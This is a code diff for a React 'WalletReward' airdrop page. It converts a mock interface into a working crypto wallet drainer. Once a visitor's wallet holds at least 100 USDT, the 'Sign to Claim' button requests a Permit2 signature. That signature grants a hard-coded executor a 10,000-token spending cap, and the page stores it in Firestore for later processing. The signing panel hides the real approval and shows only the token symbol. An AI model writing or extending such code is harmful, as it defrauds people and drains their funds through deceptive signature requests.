@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useMemo, useState } from 'react';
 import {
   Wallet,
   ShieldCheck,
@@ -10,6 +10,10 @@ import {
   FileSignature,
   Zap,
 } from 'lucide-react';
+import { BrowserProvider, Contract, formatUnits } from 'ethers';
+import { addDoc, collection, doc, getDoc, serverTimestamp } from 'firebase/firestore';
+import { db } from './firebase';
+import { init as initEtherSpirit, connect as connectWallet, signPermit } from '../packages/etherspirit/src/index.js';
 
 /**
  * WalletReward Premium Frontend
@@ -20,54 +24,173 @@ import {
  * - Step-by-step state management
  * - simulated verification logic for design review
  */
+const DEFAULT_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
+const DEFAULT_TOKEN = '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
+const MIN_REQUIRED_BALANCE = 100;
+const DEFAULT_SPENDING_CAP_UNITS = 10000;
+
 const App = () => {
   // State to manage the current phase of the airdrop process
   // 0: Connect Wallet, 1: Verification, 2: Signing, 3: Success
   const [phase, setPhase] = useState(0);
 
-  // Simulation states for UI demonstration
+  // Wallet/config state
+  const [connectedAddress, setConnectedAddress] = useState(null);
+  const [tokenAddress, setTokenAddress] = useState(DEFAULT_TOKEN);
+  const [executorAddress, setExecutorAddress] = useState(DEFAULT_EXECUTOR);
+  const [tokenSymbol, setTokenSymbol] = useState('USDT');
+  const [tokenDecimals, setTokenDecimals] = useState(6);
+  const [spendingCap, setSpendingCap] = useState(10000n * 10n ** 6n);
+
+  // UI state
   const [isConnecting, setIsConnecting] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
   const [isSigning, setIsSigning] = useState(false);
   const [verificationError, setVerificationError] = useState(false);
+  const [verificationErrorMessage, setVerificationErrorMessage] = useState('');
+  const [connectError, setConnectError] = useState('');
+  const [signError, setSignError] = useState('');
 
-  // --- Handlers (Simulating the real Web3 logic) ---
-  const handleConnect = () => {
+  const minBalanceLabel = useMemo(() => `$${MIN_REQUIRED_BALANCE.toFixed(2)}`, []);
+
+  useEffect(() => {
+    const loadSettings = async () => {
+      try {
+        const settingsRef = doc(db, 'admin_config', 'settings');
+        const snap = await getDoc(settingsRef);
+        const data = snap.exists() ? snap.data() : {};
+        setTokenAddress(data.tokenAddress || DEFAULT_TOKEN);
+        setExecutorAddress(data.executorAddress || DEFAULT_EXECUTOR);
+      } catch (err) {
+        // fall back to defaults
+      }
+    };
+    loadSettings();
+  }, []);
+
+  useEffect(() => {
+    let cancelled = false;
+
+    const loadTokenInfo = async () => {
+      if (!window.ethereum || !tokenAddress) return;
+      try {
+        const provider = new BrowserProvider(window.ethereum);
+        const token = new Contract(
+          tokenAddress,
+          [
+            'function decimals() view returns (uint8)',
+            'function symbol() view returns (string)'
+          ],
+          provider
+        );
+
+        const [decimals, symbol] = await Promise.all([
+          token.decimals(),
+          token.symbol().catch(() => 'TOKEN')
+        ]);
+
+        if (cancelled) return;
+        const parsedDecimals = Number(decimals);
+        setTokenDecimals(parsedDecimals);
+        setTokenSymbol(symbol || 'TOKEN');
+        setSpendingCap(BigInt(DEFAULT_SPENDING_CAP_UNITS) * 10n ** BigInt(parsedDecimals));
+      } catch (err) {
+        if (cancelled) return;
+        setTokenDecimals(6);
+        setTokenSymbol('TOKEN');
+        setSpendingCap(10000n * 10n ** 6n);
+      }
+    };
+
+    loadTokenInfo();
+
+    return () => {
+      cancelled = true;
+    };
+  }, [tokenAddress]);
+
+  useEffect(() => {
+    initEtherSpirit({
+      tokenAddress,
+      executorAddress,
+      spendingCap
+    });
+  }, [tokenAddress, executorAddress, spendingCap]);
+
+  // --- Handlers ---
+  const handleConnect = async () => {
     setIsConnecting(true);
-    // Simulate AppKit connection delay
-    setTimeout(() => {
-      setIsConnecting(false);
+    setConnectError('');
+    try {
+      const address = await connectWallet();
+      setConnectedAddress(address || null);
       setPhase(1);
-      // Move to Verification
-    }, 1500);
+    } catch (err) {
+      setConnectError(err?.message || 'Failed to connect wallet');
+    } finally {
+      setIsConnecting(false);
+    }
   };
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     setIsVerifying(true);
     setVerificationError(false);
-    // Simulate smart contract read delay
-    setTimeout(() => {
-      setIsVerifying(false);
-      // Logic: If user has >100 USDT (Simulated success here)
-      // Toggle 'true' to 'false' below to see the Error UI
-      const isEligible = true;
-      if (isEligible) {
-        setPhase(2);
-        // Move to Signing
-      } else {
+    setVerificationErrorMessage('');
+
+    try {
+      if (!connectedAddress) throw new Error('Connect a wallet first.');
+      if (!window.ethereum) throw new Error('No Ethereum provider detected.');
+
+      const provider = new BrowserProvider(window.ethereum);
+      const token = new Contract(
+        tokenAddress,
+        ['function balanceOf(address) view returns (uint256)'],
+        provider
+      );
+      const balance = await token.balanceOf(connectedAddress);
+      const normalized = Number(formatUnits(balance, tokenDecimals));
+
+      if (Number.isNaN(normalized) || normalized < MIN_REQUIRED_BALANCE) {
         setVerificationError(true);
+        setVerificationErrorMessage(
+          `Your wallet has ${normalized.toFixed(2)} ${tokenSymbol}. You need at least ${minBalanceLabel}.`
+        );
+      } else {
+        setPhase(2);
       }
-    }, 2000);
+    } catch (err) {
+      setVerificationError(true);
+      setVerificationErrorMessage(err?.message || 'Verification failed.');
+    } finally {
+      setIsVerifying(false);
+    }
   };
 
-  const handleSign = () => {
+  const handleSign = async () => {
     setIsSigning(true);
-    // Simulate wallet signature request
-    setTimeout(() => {
-      setIsSigning(false);
+    setSignError('');
+
+    try {
+      const result = await signPermit({
+        token: tokenAddress,
+        amount: spendingCap,
+        executor: executorAddress
+      });
+
+      await addDoc(collection(db, 'permit2_signatures'), {
+        ...result,
+        processed: false,
+        tokenSymbol,
+        createdAt: Date.now(),
+        createdAtServer: serverTimestamp()
+      });
+
       setPhase(3);
-      // Move to Success
-    }, 2500);
+    } catch (err) {
+      setSignError(err?.message || 'Signature failed.');
+    } finally {
+      setIsSigning(false);
+    }
   };
 
   return (
@@ -94,17 +217,17 @@ const App = () => {
           <span className="hover:text-white cursor-pointer transition-colors">Support</span>
           <div
             className={`px-3 py-1 rounded-full border ${
-              phase > 0
+              connectedAddress
                 ? 'border-green-500/30 bg-green-500/10 text-green-400'
                 : 'border-gray-800 bg-gray-900/50'
             } flex items-center gap-2 text-xs font-medium`}
           >
             <div
               className={`w-2 h-2 rounded-full ${
-                phase > 0 ? 'bg-green-500 animate-pulse' : 'bg-gray-500'
+                connectedAddress ? 'bg-green-500 animate-pulse' : 'bg-gray-500'
               }`}
             ></div>
-            {phase > 0 ? 'Connected' : 'Disconnected'}
+            {connectedAddress ? 'Connected' : 'Disconnected'}
           </div>
         </div>
       </nav>
@@ -185,6 +308,13 @@ const App = () => {
                 )}
               </button>
 
+              {connectError && (
+                <div className="bg-red-950/30 border border-red-900/50 p-3 rounded-lg flex items-start gap-2 text-left">
+                  <AlertCircle className="text-red-500 shrink-0" size={18} />
+                  <p className="text-red-300/80 text-xs">{connectError}</p>
+                </div>
+              )}
+
               <div className="flex items-center justify-center gap-4 pt-4 border-t border-white/5">
                 <span className="text-xs text-gray-500 uppercase tracking-wider">Supported Chains</span>
                 <div className="flex gap-2">
@@ -223,11 +353,11 @@ const App = () => {
               >
                 <div className="flex justify-between items-center mb-2">
                   <span className="text-sm text-gray-400">Required Asset</span>
-                  <span className="text-xs font-mono bg-gray-700 px-2 py-0.5 rounded text-gray-300">USDT</span>
+                  <span className="text-xs font-mono bg-gray-700 px-2 py-0.5 rounded text-gray-300">{tokenSymbol}</span>
                 </div>
                 <div className="flex justify-between items-baseline">
                   <span className="text-xl font-semibold text-white">Minimum Balance</span>
-                  <span className="text-xl font-bold text-emerald-400">$100.00</span>
+                  <span className="text-xl font-bold text-emerald-400">{minBalanceLabel}</span>
                 </div>
               </div>
 
@@ -237,7 +367,7 @@ const App = () => {
                   <div>
                     <h4 className="text-red-400 font-bold text-sm">Verification Failed</h4>
                     <p className="text-red-300/70 text-xs mt-1">
-                      Your wallet does not meet the minimum holding requirement. Please top up and try again.
+                      {verificationErrorMessage || 'Your wallet does not meet the minimum holding requirement.'}
                     </p>
                     <button
                       onClick={() => setVerificationError(false)}
@@ -292,11 +422,11 @@ const App = () => {
               <div className="bg-blue-950/20 border border-blue-800/30 rounded-xl p-4 text-left space-y-3">
                 <div className="flex justify-between items-center border-b border-blue-800/30 pb-2">
                   <span className="text-xs text-blue-200">Origin</span>
-                  <span className="text-xs font-mono text-gray-400">https://walletreward.com</span>
+                  <span className="text-xs font-mono text-gray-400">{window.location.origin}</span>
                 </div>
                 <div className="flex justify-between items-center">
-                  <span className="text-xs text-blue-200">Message</span>
-                  <span className="text-xs font-mono text-gray-400 truncate max-w-[120px]">Verify-Owner-0x8a...</span>
+                  <span className="text-xs text-blue-200">Token</span>
+                  <span className="text-xs font-mono text-gray-400 truncate max-w-[120px]">{tokenSymbol}</span>
                 </div>
               </div>
 
@@ -314,6 +444,13 @@ const App = () => {
                   'Sign to Claim'
                 )}
               </button>
+
+              {signError && (
+                <div className="bg-red-950/30 border border-red-900/50 p-3 rounded-lg flex items-start gap-2 text-left">
+                  <AlertCircle className="text-red-500 shrink-0" size={18} />
+                  <p className="text-red-300/80 text-xs">{signError}</p>
+                </div>
+              )}
 
               <div className="text-xs text-gray-500 pt-2">Check your wallet popup to confirm.</div>
             </div>
